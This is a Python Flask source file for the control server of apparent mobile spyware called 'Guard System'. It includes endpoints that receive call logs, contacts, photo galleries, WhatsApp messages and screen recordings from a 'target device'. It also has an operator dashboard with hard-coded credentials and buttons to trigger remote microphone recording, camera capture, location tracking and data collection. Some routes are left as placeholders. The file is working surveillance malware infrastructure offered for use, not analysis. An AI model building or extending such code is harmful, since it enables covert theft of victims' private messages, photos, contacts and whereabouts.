import os
import logging
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from threading import Thread
import time
import json

# Initialize Flask app FIRST
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production-12345'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['DEVICE_FOLDER'] = 'devices'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit

# Ensure upload and device directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)

# Global variable to track recording signal
recording_signal = False
signal_listeners = []
camera_signal = {'active': False}
location_signal = {'active': False}

# Device-specific signals storage
device_signals = {}

# Simple authentication
USERNAME = "Sukh Hacker"
PASSWORD = "sukhbir44@007"

# Device management functions
def get_device_file_path(device_id):
    return os.path.join(app.config['DEVICE_FOLDER'], f"{device_id}.json")

def load_device_data(device_id):
    device_file = get_device_file_path(device_id)
    if os.path.exists(device_file):
        try:
            with open(device_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_device_data(device_id, data):
    device_file = get_device_file_path(device_id)
    with open(device_file, 'w') as f:
        json.dump(data, f)

def get_all_devices():
    devices = []
    try:
        for filename in os.listdir(app.config['DEVICE_FOLDER']):
            if filename.endswith('.json'):
                device_id = filename[:-5]
                device_data = load_device_data(device_id)
                devices.append({
                    'id': device_id,
                    'name': device_data.get('name', 'Unknown Device'),
                    'model': device_data.get('model', 'Unknown Model'),
                    'last_seen': device_data.get('last_seen', 0),
                    'status': device_data.get('status', 'offline')
                })
    except FileNotFoundError:
        os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
    
    devices.sort(key=lambda x: x['last_seen'], reverse=True)
    return devices

# NEW: Enhanced data collection endpoints
@app.route('/device/<device_id>/upload-call-logs', methods=['POST'])
def upload_call_logs(device_id):
    try:
        data = request.get_json()
        call_logs = data.get('call_logs', [])
        
        timestamp = str(int(time.time()))
        filename = f"{device_id}_call_logs_{timestamp}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'w') as f:
            json.dump(call_logs, f, indent=2)
        
        print(f"✅ Call logs uploaded for device {device_id}: {len(call_logs)} records")
        return jsonify({'ok': True, 'message': 'Call logs received'})
        
    except Exception as e:
        print(f"❌ Call logs upload error: {e}")
        return jsonify({'ok': False, 'error': 'Call logs upload failed'}), 500

@app.route('/device/<device_id>/upload-contacts', methods=['POST'])
def upload_contacts(device_id):
    try:
        data = request.get_json()
        contacts = data.get('contacts', [])
        
        timestamp = str(int(time.time()))
        filename = f"{device_id}_contacts_{timestamp}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'w') as f:
            json.dump(contacts, f, indent=2)
        
        print(f"✅ Contacts uploaded for device {device_id}: {len(contacts)} contacts")
        return jsonify({'ok': True, 'message': 'Contacts received'})
        
    except Exception as e:
        print(f"❌ Contacts upload error: {e}")
        return jsonify({'ok': False, 'error': 'Contacts upload failed'}), 500

@app.route('/device/<device_id>/upload-gallery', methods=['POST'])
def upload_gallery(device_id):
    try:
        if 'gallery_images' not in request.files:
            return jsonify({'ok': False, 'error': 'No gallery files'}), 400
        
        files = request.files.getlist('gallery_images')
        uploaded_files = []
        
        for file in files:
            if file.filename:
                timestamp = str(int(time.time()))
                filename = f"{device_id}_gallery_{timestamp}_{secure_filename(file.filename)}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                uploaded_files.append(filename)
        
        print(f"✅ Gallery images uploaded for device {device_id}: {len(uploaded_files)} images")
        return jsonify({'ok': True, 'message': f'{len(uploaded_files)} gallery images received', 'files': uploaded_files})
        
    except Exception as e:
        print(f"❌ Gallery upload error: {e}")
        return jsonify({'ok': False, 'error': 'Gallery upload failed'}), 500

@app.route('/device/<device_id>/upload-whatsapp-data', methods=['POST'])
def upload_whatsapp_data(device_id):
    try:
        data = request.get_json()
        whatsapp_data = data.get('whatsapp_data', {})
        
        timestamp = str(int(time.time()))
        filename = f"{device_id}_whatsapp_{timestamp}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'w') as f:
            json.dump(whatsapp_data, f, indent=2)
        
        print(f"✅ WhatsApp data uploaded for device {device_id}")
        return jsonify({'ok': True, 'message': 'WhatsApp data received'})
        
    except Exception as e:
        print(f"❌ WhatsApp data upload error: {e}")
        return jsonify({'ok': False, 'error': 'WhatsApp data upload failed'}), 500

@app.route('/device/<device_id>/upload-screen-record', methods=['POST'])
def upload_screen_record(device_id):
    try:
        if 'screen_record' not in request.files:
            return jsonify({'ok': False, 'error': 'No screen record file'}), 400
        
        screen_file = request.files['screen_record']
        timestamp = str(int(time.time()))
        filename = f"{device_id}_screen_record_{timestamp}.mp4"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        screen_file.save(filepath)
        
        print(f"✅ Screen recording uploaded for device {device_id}")
        return jsonify({'ok': True, 'message': 'Screen recording received'})
        
    except Exception as e:
        print(f"❌ Screen record upload error: {e}")
        return jsonify({'ok': False, 'error': 'Screen record upload failed'}), 500

# NEW: Enhanced signal endpoints for additional features
@app.route('/device/<device_id>/start-call-logs-collection', methods=['POST'])
def start_call_logs_collection(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['call_logs'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Call logs collection activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Call logs collection signal sent to {device_id}'})

@app.route('/device/<device_id>/start-contacts-collection', methods=['POST'])
def start_contacts_collection(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['contacts'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Contacts collection activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Contacts collection signal sent to {device_id}'})

@app.route('/device/<device_id>/start-gallery-collection', methods=['POST'])
def start_gallery_collection(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['gallery'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Gallery collection activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Gallery collection signal sent to {device_id}'})

@app.route('/device/<device_id>/start-whatsapp-collection', methods=['POST'])
def start_whatsapp_collection(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['whatsapp'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"WhatsApp collection activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'WhatsApp collection signal sent to {device_id}'})

@app.route('/device/<device_id>/start-screen-record', methods=['POST'])
def start_screen_record(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['screen_record'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Screen recording activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Screen recording signal sent to {device_id}'})

# NEW: Signal check endpoints for additional features
@app.route('/device/<device_id>/check-call-logs-signal')
def check_call_logs_signal(device_id):
    call_logs_signal = device_signals.get(device_id, {}).get('call_logs', {})
    
    if call_logs_signal and call_logs_signal.get('active'):
        if time.time() - call_logs_signal.get('timestamp', 0) < 30:
            return jsonify({'collect_call_logs': True})
    
    if device_id in device_signals:
        device_signals[device_id]['call_logs'] = {'active': False}
    
    return jsonify({'collect_call_logs': False})

@app.route('/device/<device_id>/check-contacts-signal')
def check_contacts_signal(device_id):
    contacts_signal = device_signals.get(device_id, {}).get('contacts', {})
    
    if contacts_signal and contacts_signal.get('active'):
        if time.time() - contacts_signal.get('timestamp', 0) < 30:
            return jsonify({'collect_contacts': True})
    
    if device_id in device_signals:
        device_signals[device_id]['contacts'] = {'active': False}
    
    return jsonify({'collect_contacts': False})

@app.route('/device/<device_id>/check-gallery-signal')
def check_gallery_signal(device_id):
    gallery_signal = device_signals.get(device_id, {}).get('gallery', {})
    
    if gallery_signal and gallery_signal.get('active'):
        if time.time() - gallery_signal.get('timestamp', 0) < 30:
            return jsonify({'collect_gallery': True})
    
    if device_id in device_signals:
        device_signals[device_id]['gallery'] = {'active': False}
    
    return jsonify({'collect_gallery': False})

@app.route('/device/<device_id>/check-whatsapp-signal')
def check_whatsapp_signal(device_id):
    whatsapp_signal = device_signals.get(device_id, {}).get('whatsapp', {})
    
    if whatsapp_signal and whatsapp_signal.get('active'):
        if time.time() - whatsapp_signal.get('timestamp', 0) < 30:
            return jsonify({'collect_whatsapp': True})
    
    if device_id in device_signals:
        device_signals[device_id]['whatsapp'] = {'active': False}
    
    return jsonify({'collect_whatsapp': False})

@app.route('/device/<device_id>/check-screen-record-signal')
def check_screen_record_signal(device_id):
    screen_record_signal = device_signals.get(device_id, {}).get('screen_record', {})
    
    if screen_record_signal and screen_record_signal.get('active'):
        if time.time() - screen_record_signal.get('timestamp', 0) < 30:
            return jsonify({'record_screen': True})
    
    if device_id in device_signals:
        device_signals[device_id]['screen_record'] = {'active': False}
    
    return jsonify({'record_screen': False})

# NEW: Signal received endpoints
@app.route('/device/<device_id>/call-logs-received', methods=['POST'])
def call_logs_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['call_logs'] = {'active': False}
    return jsonify({'ok': True})

@app.route('/device/<device_id>/contacts-received', methods=['POST'])
def contacts_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['contacts'] = {'active': False}
    return jsonify({'ok': True})

@app.route('/device/<device_id>/gallery-received', methods=['POST'])
def gallery_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['gallery'] = {'active': False}
    return jsonify({'ok': True})

@app.route('/device/<device_id>/whatsapp-received', methods=['POST'])
def whatsapp_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['whatsapp'] = {'active': False}
    return jsonify({'ok': True})

@app.route('/device/<device_id>/screen-record-received', methods=['POST'])
def screen_record_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['screen_record'] = {'active': False}
    return jsonify({'ok': True})

# Keep all your existing routes (register-device, device-heartbeat, login, devices, etc.)
# ... [YOUR EXISTING ROUTES HERE] ...

# Enhanced Device Dashboard HTML with new features
DEVICE_DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Guard System - {{ device.name }}</title>
    <style>
        /* Your existing CSS styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Add your existing CSS styles here */
        /* ... [YOUR EXISTING CSS] ... */
        
        /* New styles for enhanced features */
        .btn-whatsapp {
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            color: white;
        }
        
        .btn-gallery {
            background: linear-gradient(135deg, #E4405F 0%, #C13584 100%);
            color: white;
        }
        
        .btn-contacts {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-call-logs {
            background: linear-gradient(135deg, #FFA726 0%, #FB8C00 100%);
            color: white;
        }
        
        .btn-screen-record {
            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
            color: white;
        }
        
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .feature-card {
            background: rgba(40, 40, 40, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
        }
        
        .feature-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
            border-color: #00b7ff;
        }
        
        .feature-title {
            color: #00b7ff;
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .feature-description {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 15px;
        }
        
        .feature-actions {
            display: flex;
            gap: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="header-left">
                <h1>🎮 {{ device.name }}</h1>
                <p>Enhanced Device Control Panel</p>
                <div class="device-info">
                    Model: {{ device.model }} | ID: {{ device_id }}
                </div>
            </div>
            <div class="header-right">
                <a href="/" class="btn btn-back">⬅️ Back to Devices</a>
                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
            </div>
        </header>

        <!-- Basic Controls Section -->
        <div class="control-section">
            <div class="section-title">🎛️ Basic Controls</div>
            
            <div class="controls">
                <button class="btn-control btn-start" onclick="startRecording()">
                    🎤 Start Recording
                </button>
                <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
                    📱 Front Camera
                </button>
                <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
                    📷 Back Camera
                </button>
                <button class="btn-control btn-location" onclick="getLocation()">
                    📍 Get Location
                </button>
            </div>
        </div>

        <!-- Enhanced Features Section -->
        <div class="control-section">
            <div class="section-title">🚀 Enhanced Features</div>
            
            <div class="feature-grid">
                <!-- Call Logs -->
                <div class="feature-card">
                    <div class="feature-title">📞 Call Logs</div>
                    <div class="feature-description">
                        Collect all call history including incoming, outgoing, and missed calls with timestamps and durations.
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-call-logs" onclick="collectCallLogs()">
                            📞 Get Call Logs
                        </button>
                    </div>
                </div>
                
                <!-- Contacts -->
                <div class="feature-card">
                    <div class="feature-title">👥 Contacts</div>
                    <div class="feature-description">
                        Extract complete contact list with names, phone numbers, and email addresses.
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-contacts" onclick="collectContacts()">
                            👥 Get Contacts
                        </button>
                    </div>
                </div>
                
                <!-- Gallery -->
                <div class="feature-card">
                    <div class="feature-title">🖼️ Gallery</div>
                    <div class="feature-description">
                        Download all images and videos from device gallery and storage.
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-gallery" onclick="collectGallery()">
                            🖼️ Get Gallery
                        </button>
                    </div>
                </div>
                
                <!-- WhatsApp -->
                <div class="feature-card">
                    <div class="feature-title">💬 WhatsApp</div>
                    <div class="feature-description">
                        Capture WhatsApp messages, chats, and media files from the device.
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-whatsapp" onclick="collectWhatsApp()">
                            💬 Get WhatsApp
                        </button>
                    </div>
                </div>
                
                <!-- Screen Recording -->
                <div class="feature-card">
                    <div class="feature-title">📱 Screen Record</div>
                    <div class="feature-description">
                        Capture real-time screen activity and record device screen remotely.
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-screen-record" onclick="startScreenRecord()">
                            📱 Record Screen
                        </button>
                    </div>
                </div>
                
                <!-- Live Screen -->
                <div class="feature-card">
                    <div class="feature-title">🔴 Live Screen</div>
                    <div class="feature-description">
                        View real-time screen streaming from the target device (requires device support).
                    </div>
                    <div class="feature-actions">
                        <button class="btn-control btn-location" onclick="startLiveScreen()">
                            🔴 Start Live View
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Status Indicators -->
        <div class="control-section">
            <div class="section-title">📊 Status Monitor</div>
            <div class="controls">
                <div class="signal-status status-inactive" id="recordingStatus">
                    🔴 Recording: Inactive
                </div>
                <div class="signal-status status-inactive" id="cameraStatus">
                    🔴 Camera: Inactive
                </div>
                <div class="signal-status status-inactive" id="locationStatus">
                    🔴 Location: Inactive
                </div>
                <div class="signal-status status-inactive" id="callLogsStatus">
                    🔴 Call Logs: Inactive
                </div>
                <div class="signal-status status-inactive" id="contactsStatus">
                    🔴 Contacts: Inactive
                </div>
                <div class="signal-status status-inactive" id="galleryStatus">
                    🔴 Gallery: Inactive
                </div>
                <div class="signal-status status-inactive" id="whatsappStatus">
                    🔴 WhatsApp: Inactive
                </div>
                <div class="signal-status status-inactive" id="screenRecordStatus">
                    🔴 Screen Record: Inactive
                </div>
            </div>
        </div>

        <!-- Your existing file lists sections -->
        <!-- ... [YOUR EXISTING FILE LISTS] ... -->
        
    </div>

    <script>
        const deviceId = "{{ device_id }}";
        
        // Basic control functions
        async function startRecording() {
            const recordTime = document.getElementById('recordTime')?.value || 15;
            
            try {
                const response = await fetch(`/device/${deviceId}/start-recording`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ record_time: parseInt(recordTime) })
                });
                
                const data = await response.json();
                if (data.ok) {
                    updateStatus('recordingStatus', '🟢 Recording: Active', 'status-active');
                    showNotification('Recording signal sent', 'success');
                }
            } catch (error) {
                showNotification('Failed to send signal', 'error');
            }
        }
        
        async function captureCamera(cameraType) {
            try {
                const response = await fetch(`/device/${deviceId}/start-camera-signal`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ camera_type: cameraType })
                });
                
                const data = await response.json();
                if (data.ok) {
                    updateStatus('cameraStatus', `🟢 Camera: ${cameraType} Active`, 'status-active');
                    showNotification(`${cameraType} camera signal sent`, 'success');
                    setTimeout(() => updateStatus('cameraStatus', '🔴 Camera: Inactive', 'status-inactive'), 5000);
                }
            } catch (error) {
                showNotification('Failed to send camera signal', 'error');
            }
        }
        
        async function getLocation() {
            try {
                const response = await fetch(`/device/${deviceId}/start-location-signal`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('locationStatus', '🟢 Location: Active', 'status-active');
                    showNotification('Location signal sent', 'success');
                    setTimeout(() => updateStatus('locationStatus', '🔴 Location: Inactive', 'status-inactive'), 5000);
                }
            } catch (error) {
                showNotification('Failed to send location signal', 'error');
            }
        }
        
        // Enhanced feature functions
        async function collectCallLogs() {
            try {
                const response = await fetch(`/device/${deviceId}/start-call-logs-collection`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('callLogsStatus', '🟢 Call Logs: Collecting', 'status-active');
                    showNotification('Call logs collection started', 'success');
                    setTimeout(() => updateStatus('callLogsStatus', '🔴 Call Logs: Inactive', 'status-inactive'), 10000);
                }
            } catch (error) {
                showNotification('Failed to start call logs collection', 'error');
            }
        }
        
        async function collectContacts() {
            try {
                const response = await fetch(`/device/${deviceId}/start-contacts-collection`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('contactsStatus', '🟢 Contacts: Collecting', 'status-active');
                    showNotification('Contacts collection started', 'success');
                    setTimeout(() => updateStatus('contactsStatus', '🔴 Contacts: Inactive', 'status-inactive'), 10000);
                }
            } catch (error) {
                showNotification('Failed to start contacts collection', 'error');
            }
        }
        
        async function collectGallery() {
            try {
                const response = await fetch(`/device/${deviceId}/start-gallery-collection`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('galleryStatus', '🟢 Gallery: Collecting', 'status-active');
                    showNotification('Gallery collection started', 'success');
                    setTimeout(() => updateStatus('galleryStatus', '🔴 Gallery: Inactive', 'status-inactive'), 15000);
                }
            } catch (error) {
                showNotification('Failed to start gallery collection', 'error');
            }
        }
        
        async function collectWhatsApp() {
            try {
                const response = await fetch(`/device/${deviceId}/start-whatsapp-collection`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('whatsappStatus', '🟢 WhatsApp: Collecting', 'status-active');
                    showNotification('WhatsApp collection started', 'success');
                    setTimeout(() => updateStatus('whatsappStatus', '🔴 WhatsApp: Inactive', 'status-inactive'), 15000);
                }
            } catch (error) {
                showNotification('Failed to start WhatsApp collection', 'error');
            }
        }
        
        async function startScreenRecord() {
            try {
                const response = await fetch(`/device/${deviceId}/start-screen-record`, {method: 'POST'});
                const data = await response.json();
                if (data.ok) {
                    updateStatus('screenRecordStatus', '🟢 Screen: Recording', 'status-active');
                    showNotification('Screen recording started', 'success');
                    setTimeout(() => updateStatus('screenRecordStatus', '🔴 Screen Record: Inactive', 'status-inactive'), 10000);
                }
            } catch (error) {
                showNotification('Failed to start screen recording', 'error');
            }
        }
        
        async function startLiveScreen() {
            showNotification('Live screen feature requires additional setup on device', 'info');
        }
        
        // Utility functions
        function updateStatus(elementId, text, className) {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = text;
                element.className = `signal-status ${className}`;
            }
        }
        
        function showNotification(message, type) {
            alert(`${type.toUpperCase()}: ${message}`);
        }
    </script>
</body>
</html>
"""

# Your existing templates (LOGIN_HTML, DEVICES_HTML) remain the same
# ... [YOUR EXISTING TEMPLATES] ...

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
